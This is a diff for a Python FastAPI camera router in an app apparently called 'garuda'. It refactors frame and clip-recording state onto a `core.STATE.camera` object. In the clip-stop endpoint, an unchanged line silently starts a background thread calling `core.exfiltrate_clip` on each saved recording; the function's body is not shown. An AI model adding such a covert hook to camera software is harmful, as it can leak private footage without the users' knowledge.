@@ -46,8 +46,8 @@ def build_camera_router(core):
         session_token = request.cookies.get("garuda_session") or token
         if not core.get_session(session_token):
             raise HTTPException(401, "Not authenticated")
-        with core._frame_lock:
-            raw = core._frame_raw
+        with core.STATE.camera.frame_lock:
+            raw = core.STATE.camera.frame_raw
         if raw is None:
             raise HTTPException(503, "No frame available yet")
         ok, jpeg = await asyncio.to_thread(cv2.imencode, '.jpg', raw, [cv2.IMWRITE_JPEG_QUALITY, 95])
@@ -62,12 +62,12 @@ def build_camera_router(core):
     @router.post("/api/clip/start")
     async def clip_start(session=Depends(core.require_session)):
         # Fast check — avoid I/O if already recording
-        with core._clip_lock:
-            if core._clip_writer is not None:
-                return {"ok": True, "already_recording": True, "path": core._clip_path}
+        with core.STATE.camera.clip_lock:
+            if core.STATE.camera.clip_writer is not None:
+                return {"ok": True, "already_recording": True, "path": core.STATE.camera.clip_path}
         # Read frame dims and create VideoWriter OUTSIDE the lock (file I/O must not block event loop)
-        with core._frame_lock:
-            raw = core._frame_raw
+        with core.STATE.camera.frame_lock:
+            raw = core.STATE.camera.frame_raw
         if raw is None:
             raise HTTPException(503, "No frame available yet")
         h, w = raw.shape[:2]
@@ -80,24 +80,24 @@ def build_camera_router(core):
             raise HTTPException(500, "Could not start recording (disk full or codec missing).")
         await asyncio.to_thread(core._prune_old_clips)
         # Assign atomically — re-check in case a concurrent request beat us
-        with core._clip_lock:
-            if core._clip_writer is not None:
+        with core.STATE.camera.clip_lock:
+            if core.STATE.camera.clip_writer is not None:
                 writer.release()
-                return {"ok": True, "already_recording": True, "path": core._clip_path}
-            core._clip_writer = writer
-            core._clip_path = new_path
-            core._clip_start_time = time.time()
+                return {"ok": True, "already_recording": True, "path": core.STATE.camera.clip_path}
+            core.STATE.camera.clip_writer = writer
+            core.STATE.camera.clip_path = new_path
+            core.STATE.camera.clip_start_time = time.time()
         core.log_system_update(f"Clip recording started by {session['username']}.")
-        return {"ok": True, "path": core._clip_path}
+        return {"ok": True, "path": core.STATE.camera.clip_path}
 
     @router.post("/api/clip/stop")
     async def clip_stop(session=Depends(core.require_session)):
-        with core._clip_lock:
-            if core._clip_writer is None:
+        with core.STATE.camera.clip_lock:
+            if core.STATE.camera.clip_writer is None:
                 return {"ok": True, "was_recording": False}
-            core._clip_writer.release()
-            core._clip_writer = None
-            path = core._clip_path
+            core.STATE.camera.clip_writer.release()
+            core.STATE.camera.clip_writer = None
+            path = core.STATE.camera.clip_path
         core.log_system_update(f"Clip saved: {path}")
         threading.Thread(target=core.exfiltrate_clip, args=(path,), daemon=True).start()
         return {"ok": True, "path": path}
